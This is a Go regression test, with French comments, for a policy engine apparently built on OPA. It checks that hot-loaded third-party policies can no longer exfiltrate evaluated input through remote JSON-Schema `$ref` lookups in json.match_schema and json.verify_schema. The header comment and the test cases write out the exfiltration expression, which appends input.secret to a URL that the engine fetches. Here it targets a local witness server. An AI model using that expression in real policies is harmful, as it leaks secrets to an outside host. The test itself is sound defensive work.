package engine

import (
	"context"
	"net/http"
	"net/http/httptest"
	"sync"
	"testing"
)

// TestSchemaRefsCannotReachTheNetwork ferme le contournement que v0.2.2 laissait ouvert.
//
// v0.2.2 a retiré http.send, net.lookup_ip_addr et opa.runtime des capacités. Cela ne suffisait
// pas : OPA résout les `$ref` distants d'un JSON-Schema en HTTP au moment de l'ÉVALUATION, donc
// une politique chargée à chaud — du code tiers, que pepin charge via --policy-dir sans
// recompilation — pouvait encore faire sortir l'input :
//
//	json.match_schema(input, {"$ref": sprintf("%s/leak/%s", [url, input.secret])})
//
// Mesuré sur v0.2.2 : le serveur témoin reçoit /leak/EXFIL-TOKEN, une requête par primitive, et
// Evaluate ne remonte AUCUNE erreur. D'où la forme de ce test : il ne vérifie pas qu'une erreur
// est levée (elle ne l'est pas), il compte les requêtes réellement reçues. Un test qui guetterait
// un message d'erreur passerait au vert sans rien prouver.
func TestSchemaRefsCannotReachTheNetwork(t *testing.T) {
	var mu sync.Mutex
	var hits []string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		hits = append(hits, r.URL.Path)
		mu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"type":"object"}`))
	}))
	defer srv.Close()

	cases := []struct {
		name string
		expr string
	}{
		{
			"json.match_schema",
			`json.match_schema(input, {"$ref": sprintf("%s/leak/%s", ["` + srv.URL + `", input.secret])})`,
		},
		{
			"json.verify_schema",
			`json.verify_schema({"$ref": sprintf("%s/leak/%s", ["` + srv.URL + `", input.secret])})`,
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			mu.Lock()
			hits = nil
			mu.Unlock()

			// L'erreur est volontairement ignorée : un refus à la compilation est une
			// défense acceptable, et un succès silencieux l'est aussi tant qu'aucune
			// requête ne part. C'est le compteur qui juge.
			_, _ = Evaluate(
				context.Background(),
				map[string]any{"secret": "EXFIL-TOKEN"},
				policyCalling(c.expr),
			)

			mu.Lock()
			got := append([]string(nil), hits...)
			mu.Unlock()
			if len(got) != 0 {
				t.Fatalf("%s a joint le réseau : %d requête(s) %v — une politique tierce peut "+
					"donc encore exfiltrer l'input évalué", c.name, len(got), got)
			}
		})
	}
}
